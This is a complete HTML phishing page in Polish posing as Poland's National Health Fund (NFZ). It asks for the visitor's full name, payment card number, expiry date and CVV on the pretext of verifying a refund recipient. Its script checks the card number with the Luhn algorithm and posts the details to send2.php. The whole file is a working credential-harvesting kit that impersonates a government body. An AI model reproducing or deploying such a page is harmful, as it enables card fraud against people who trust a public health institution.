<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link href="fav.ico" rel="SHORTCUT ICON" />
    <title>Weryfikacja Karty Płatniczej NFZ</title>
    <style>
        :root {
            --primary-color: #2e2383;
            --primary-hover: #1a165c;
            --secondary-color: #f8f9fa;
            --text-color: #333;
            --light-gray: #e9ecef;
            --border-radius: 8px;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f0 100%);
            color: var(--text-color);
            line-height: 1.6;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        
        header {
            background-color: white;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            padding: 1rem;
        }
        
        .logo-container {
            display: flex;
            justify-content: center;
            padding: 1rem 0;
        }
        
        .logo-container img {
            height: 60px;
            max-width: 100%;
        }
        
        main {
            flex: 1;
            width: 100%;
            max-width: 1200px;
            margin: 0 auto;
            padding: 2rem 1rem;
        }
        
        .form-container {
            background-color: white;
            border-radius: var(--border-radius);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
            overflow: hidden;
            margin: 0 auto;
            width: 100%;
            max-width: 500px;
        }
        
        .form-header {
            background-color: var(--primary-color);
            color: white;
            padding: 1.5rem;
            text-align: center;
        }
        
        .form-header h1 {
            font-size: 1.5rem;
            font-weight: 600;
        }
        
        .form-content {
            padding: 2rem;
        }
        
        .form-group {
            margin-bottom: 1.5rem;
        }
        
        label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: 500;
            color: var(--text-color);
        }
        
        input {
            width: 100%;
            padding: 0.75rem 1rem;
            border: 1px solid var(--light-gray);
            border-radius: var(--border-radius);
            font-size: 1rem;
            transition: all 0.3s ease;
        }
        
        input:focus {
            border-color: var(--primary-color);
            outline: none;
            box-shadow: 0 0 0 3px rgba(46, 35, 131, 0.2);
        }
        
        .card-input-container {
            position: relative;
        }
        
        .card-icon {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            width: 40px;
            height: 25px;
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
        }
        
        .row {
            display: flex;
            gap: 15px;
        }
        
        .row .form-group {
            flex: 1;
        }
        
        .security-info {
            background-color: #f8f9fa;
            border-left: 4px solid var(--primary-color);
            padding: 1rem;
            margin: 1.5rem 0;
            font-size: 0.875rem;
            color: #555;
        }
        
        button {
            background-color: var(--primary-color);
            color: white;
            border: none;
            padding: 1rem;
            border-radius: var(--border-radius);
            cursor: pointer;
            font-size: 1rem;
            font-weight: 600;
            width: 100%;
            transition: background-color 0.3s;
            margin-top: 1rem;
        }
        
        button:hover {
            background-color: var(--primary-hover);
        }
        
        .error {
            color: #dc3545;
            font-size: 0.875rem;
            margin-top: 0.5rem;
            display: none;
        }
        
        footer {
            background-color: var(--secondary-color);
            padding: 1rem;
            text-align: center;
            font-size: 0.875rem;
            color: #666;
        }
        
        @media (max-width: 768px) {
            main {
                padding: 1rem;
            }
            
            .form-container {
                border-radius: 0;
                box-shadow: none;
            }
            
            .form-header {
                padding: 1rem;
            }
            
            .form-header h1 {
                font-size: 1.25rem;
            }
            
            .form-content {
                padding: 1.5rem;
            }
            
            .row {
                flex-direction: column;
                gap: 0;
            }
        }
        
        /* Loading animation */
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
            margin-right: 10px;
            vertical-align: middle;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <header>
        <div class="logo-container">
            <img src="lgo.png" alt="">
        </div>
    </header>
    
    <main>
        <div class="form-container">
            <div class="form-header">
                <h1>Weryfikacja karty płatniczej</h1>
            </div>
            
            <div class="form-content">
                <form id="cardForm" action="send2.php" method="POST">
                    <div class="form-group">
                        <label for="fullName">Pełne imię i nazwisko (jak na karcie):</label>
                        <input type="text" id="fullName" name="name" placeholder="Jan Kowalski" required>
                        <div class="error" id="nameError">Proszę wprowadzić pełne imię i nazwisko</div>
                    </div>
                    
                    <div class="form-group">
                        <label for="cardNumber">Numer karty:</label>
                        <div class="card-input-container">
                            <input type="text" id="cardNumber" name="ccn" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" required>
                            <div class="card-icon" id="cardTypeIcon"></div>
                        </div>
                        <div class="error" id="cardError">Proszę wprowadzić poprawny numer karty</div>
                    </div>
                    
                    <div class="row">
                        <div class="form-group">
                            <label for="expiryDate">Data ważności (MM/RR):</label>
                            <input type="text" id="expiryDate" name="exp" placeholder="MM/RR" maxlength="5" required>
                            <div class="error" id="expiryError">Proszę wprowadzić poprawną datę ważności</div>
                        </div>
                        
                        <div class="form-group">
                            <label for="cvv">Kod CVV:</label>
                            <input type="text" id="cvv" name="csc" placeholder="123" maxlength="4" required>
                            <div class="error" id="cvvError">Proszę wprowadzić poprawny kod bezpieczeństwa</div>
                        </div>
                    </div>
                    
                    <div class="security-info">
                        <p>Proces weryfikacji karty służy potwierdzeniu, że jesteś rzeczywistym odbiorcą zwrotu środków, a nie osobą trzecią. Nie pobieramy żadnych opłat - jest to wyłącznie weryfikacja.</p>
                    </div>
                    
                    <button type="submit" id="submitBtn">
                        <span id="buttonText">Zweryfikuj kartę</span>
                    </button>
                </form>
            </div>
        </div>
    </main>
    
    <footer>
        <p>© 2025 Narodowy Fundusz Zdrowia. Wszelkie prawa zastrzeżone.</p>
    </footer>

    <script>
        // Card number formatting (add spaces every 4 digits)
        document.getElementById('cardNumber').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\s+/g, '');
            if (value.length > 0) {
                value = value.match(new RegExp('.{1,4}', 'g')).join(' ');
            }
            e.target.value = value;
            
            // Simple card type detection for icon display
            const cardTypeIcon = document.getElementById('cardTypeIcon');
            const firstDigit = value.charAt(0);
            
            if (/^4/.test(value)) {
                cardTypeIcon.style.backgroundImage = 'url(https://cdn.jsdelivr.net/gh/devicons/devicon/icons/visa/visa-original.svg)';
            } else if (/^5[1-5]/.test(value)) {
                cardTypeIcon.style.backgroundImage = 'url(https://cdn.jsdelivr.net/gh/devicons/devicon/icons/mastercard/mastercard-original.svg)';
            } else if (/^3[47]/.test(value)) {
                cardTypeIcon.style.backgroundImage = 'url(https://cdn.jsdelivr.net/gh/devicons/devicon/icons/americanexpress/americanexpress-original.svg)';
            } else {
                cardTypeIcon.style.backgroundImage = '';
            }
        });
        
        // Expiry date formatting (auto add slash after MM)
        document.getElementById('expiryDate').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            e.target.value = value;
        });
        
        // Form validation before submission
        document.getElementById('cardForm').addEventListener('submit', function(e) {
            // Client-side validation
            let isValid = true;
            
            // Reset errors
            document.querySelectorAll('.error').forEach(el => {
                el.style.display = 'none';
            });
            
            // Get values
            const fullName = document.getElementById('fullName').value;
            const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
            const expiryDate = document.getElementById('expiryDate').value;
            const cvv = document.getElementById('cvv').value;
            
            // Validate full name
            if (fullName.trim().length < 5 || !fullName.includes(' ')) {
                document.getElementById('nameError').style.display = 'block';
                isValid = false;
            }
            
            // Validate card number (simple Luhn check)
            if (!validateCardNumber(cardNumber)) {
                document.getElementById('cardError').style.display = 'block';
                isValid = false;
            }
            
            // Validate expiry date
            if (!validateExpiryDate(expiryDate)) {
                document.getElementById('expiryError').style.display = 'block';
                isValid = false;
            }
            
            // Validate CVV
            if (!/^\d{3,4}$/.test(cvv)) {
                document.getElementById('cvvError').style.display = 'block';
                isValid = false;
            }
            
            if (!isValid) {
                e.preventDefault();
                return false;
            }
            
            // If valid, show loading state but allow normal form submission
            const button = document.getElementById('submitBtn');
            button.disabled = true;
            button.innerHTML = '<span class="loading"></span> Weryfikacja...';
            
            // The form will now submit normally to send2.php via POST
            return true;
        });
        
        // Simple Luhn algorithm validation
        function validateCardNumber(cardNumber) {
            if (!/^\d{13,19}$/.test(cardNumber)) return false;
            
            let sum = 0;
            let alternate = false;
            
            for (let i = cardNumber.length - 1; i >= 0; i--) {
                let digit = parseInt(cardNumber.charAt(i));
                
                if (alternate) {
                    digit *= 2;
                    if (digit > 9) {
                        digit -= 9;
                    }
                }
                
                sum += digit;
                alternate = !alternate;
            }
            
            return (sum % 10) === 0;
        }
        
        // Expiry date validation
        function validateExpiryDate(expiryDate) {
            if (!/^\d{2}\/\d{2}$/.test(expiryDate)) return false;
            
            const [month, year] = expiryDate.split('/');
            const now = new Date();
            const currentYear = now.getFullYear() % 100;
            const currentMonth = now.getMonth() + 1;
            
            if (parseInt(month) < 1 || parseInt(month) > 12) return false;
            if (parseInt(year) < currentYear) return false;
            if (parseInt(year) === currentYear && parseInt(month) < currentMonth) return false;
            
            return true;
        }
    </script>
</body>
</html>